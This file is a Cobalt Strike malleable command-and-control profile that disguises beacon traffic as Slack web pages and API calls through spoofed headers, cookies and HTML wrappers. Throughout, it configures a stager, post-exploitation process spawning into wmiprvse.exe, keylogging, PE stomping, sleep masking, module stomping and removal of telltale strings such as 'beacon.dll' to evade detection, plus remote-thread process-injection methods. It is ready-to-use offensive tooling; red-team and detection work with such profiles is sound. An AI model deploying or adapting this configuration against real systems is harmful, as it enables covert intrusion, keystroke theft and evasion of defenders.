#slack profile
#used a MS dev group from a 'top slack groups' list
#xx0hcd
#Modified by Kleiton Kurti (@kleiton0x7e)

set host_stage "false";  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set sleeptime "30000";
set jitter    "20";
set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default
set dns_idle "8.8.8.8";
set maxdns    "235";

#custom cert
#https-certificate {
#    set keystore "your_store_file.store";
#    set password "your_store_pass";
#}

http-config {
#    set headers "Server, Content-Type, Cache-Control, Connection";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Connection" "close";
#    header "Cache-Control" "max-age=2";
#    header "Server" "nginx";
    #set "true" if teamserver is behind redirector
    set trust_x_forwarded_for "false";
}

http-get {

    set uri "/messages/A1537B0GM";
    
    client {

#        header "Host" "msdevchat.slack.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
	
        
        metadata {
            base64url;
            
	    append ";_ga=GA1.2.875";
	    append ";__ar_v4=%8867UMDGS643";
	    prepend "d=";
#	    prepend "cvo_sid1=R456BNMD64;";
	    prepend "_ga=GA1.2.875;";
	    prepend "b=.12vPkW22o;";
	    header "Cookie";

        }

    }

    server {

	header "Content-Type" "text/html; charset=utf-8";
	header "Connection" "close";
	header "Server" "Apache";
	header "X-XSS-Protection" "0";
	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
	header "Referrer-Policy" "no-referrer";
	header "X-Slack-Backend" "h";
	header "Pragma" "no-cache";
	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Vary" "Accept-Encoding";
	header "X-Via" "haproxy-www-w6k7";
        

        output {

            base64url;

	    prepend "<!DOCTYPE html>
<html lang=\"en-US\" class=\"supports_custom_scrollbar\">

	<head>

<meta charset=\"utf-8\">
<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
<meta name=\"referrer\" content=\"no-referrer\">
<meta name=\"superfish\" content=\"nofish\">
        <title>Microsoft Developer Chat Slack</title>
    <meta name=\"author\" content=\"Slack\">
        

	<link rel=\"dns-prefetch\" href=\"https://a.slack-edge.com?id=";

	    append "\"> </script>";
	    
	    append "<div id=\"client-ui\" class=\"container-fluid sidebar_theme_\"\"\">

	
<div id=\"banner\" class=\"hidden\" role=\"complementary\" aria-labelledby=\"notifications_banner_aria_label\">
	<h1 id=\"notifications_banner_aria_label\" class=\"offscreen\">Notifications Banner</h1>

	<div id=\"notifications_banner\" class=\"banner sk_fill_blue_bg hidden\">
		Slack needs your permission to <button type=\"button\" class=\"btn_link\">enable desktop notifications</button>.		<button type=\"button\" class=\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\" data-action=\"dismiss_banner\" aria-label=\"Dismiss\"></button>
	</div>

	<div id=\"notifications_dismiss_banner\" class=\"banner seafoam_green_bg hidden\">
		We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.		<span class=\"inline_block no_wrap\">
			<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\">Enable notifications</button> •
			<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close()\">Ask me next time</button> •
			<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>
		</span>
	</div>";

            print;
        }
    }
}

http-post {
    
    set uri "/api/api.test";

    client {

#	header "Host" "msdevchat.slack.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";     
        
        output {
            base64url;
	    
	    append ";_ga=GA1.2.875";
	    append "__ar_v4=%8867UMDGS643";
	    prepend "d=";
#	    prepend "cvo_sid1=R456BNMD64;";
	    prepend "_ga=GA1.2.875;";
	    prepend "b=.12vPkW22o;";
	    header "Cookie";


        }


        id {
#not sure on this, just trying to blend it in.
            base64url;
	    prepend "GA1.";
	    header "_ga";

        }
    }

    server {

	header "Content-Type" "application/json; charset=utf-8";
	header "Connection" "close";
	header "Server" "Apache";
	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
	header "Referrer-Policy" "no-referrer";
	header "X-Content-Type-Options" "nosniff";
	header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
	header "X-XSS-Protection" "0";
	header "X-Slack-Backend" "h";
	header "Vary" "Accept-Encoding";
	header "Access-Control-Allow-Origin" "*";
	header "X-Via" "haproxy-www-6g1x";
        

        output {
            base64;

	    prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
	    append "\"},\"warning\":\"superfluous_charset\",\"response_metadata\":{\"warnings\":[\"superfluous_charset\"]}}";

            print;
        }
    }
}

http-stager {

    set uri_x86 "/messages/DBLANIF13";
    set uri_x64 "/messages/DBLANIF13";

    client {
	header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Accept-Encoding" "gzip, deflate";
	header "Connection" "close";
    }

    server {
	header "Content-Type" "text/html; charset=utf-8";        
        header "Connection" "close";
	header "Server" "Apache";
	header "X-XSS-Protection" "0";
	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
	header "Referrer-Policy" "no-referrer";
	header "X-Slack-Backend" "h";
	header "Pragma" "no-cache";
	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Vary" "Accept-Encoding";
	header "X-Via" "haproxy-www-suhx";
    
    }


}

###Malleable PE Options###
###Post-Ex Block###
post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}

#used peclone on wwanmm.dll. 
#don't use 'set image_size_xx' if using 'set module_xx'
###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "5 May 2023 10:52:15";
    set entry_point     "170000";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    set name	        "srv.dll";
    set magic_mz_x64    "OOPS";
    set magic_mz_x86    "OOPS";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header    "\xe5\xdc\xe0\xbf\x7f\xf9\x78\x26\x9a\x8c\x1b\x50\x87\x38\x89\x6b\x0d\x83\x71\xc4\xa9\xd0\x73\x20\xe2\x75\x4c\xd9\xa4\x8d\x5a\xc7\xea\xc8\x4e\x7e\x9a\x7c\xd9\xfa\xe9\x11\x0f\x3b\xb1\x70\x54\x94\x78\xde\x70\x41\x0f\x44\xa9\x4c";  
    set sleep_mask "true";
    
    set smartinject "true";
    
    #set allocator "HeapAlloc";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        }

    transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        strrep "This program cannot be run in DOS mode" ""; # Remove this text
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        strrep "beacon.dll" ""; # Remove this text
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        strrep "Stack around the variable" "";
        strrep "was corrupted." "";
        strrep "The variable" "";
        strrep "is being used without being initialized." "";
        strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
        strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
        strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
        strrep "Stack memory was corrupted" "";
        strrep "A local variable was used before it was initialized" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around" "corrupted";
        strrep "operator" "";
        strrep "operator co_await" "";
        strrep "operator<=>" "";
        }
}

###Process Inject Block###
process-inject {
    set allocator "NtMapViewOfSection";
    set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "true";
    set min_alloc "16700";
    set userwx "false";  
    set startrwx "false";
        
    transform-x86 {
        prepend "\x0f\x1f\x00\x87\xd2\x42\x0f\x1f\x04\x00\x66\x0f\x1f\x04\x00\x66\x87\xdb\x46\x49\x4c\x41\x66\x87\xc9\x87\xdb\x90\x0f\x1f\x00\x66\x87\xd2\x40\x87\xc9\x47\x66\x90\x40\x48\x44\x0f\x1f\x00\x43\x45";
    }
    transform-x64 {
        prepend "\x0f\x1f\x00\x87\xd2\x42\x0f\x1f\x04\x00\x66\x0f\x1f\x04\x00\x66\x87\xdb\x46\x49\x4c\x41\x66\x87\xc9\x87\xdb\x90\x0f\x1f\x00\x66\x87\xd2\x40\x87\xc9\x47\x66\x90\x40\x48\x44\x0f\x1f\x00\x43\x45";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
        SetThreadContext;
        NtQueueApcThread-s;
        #NtQueueApcThread;
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
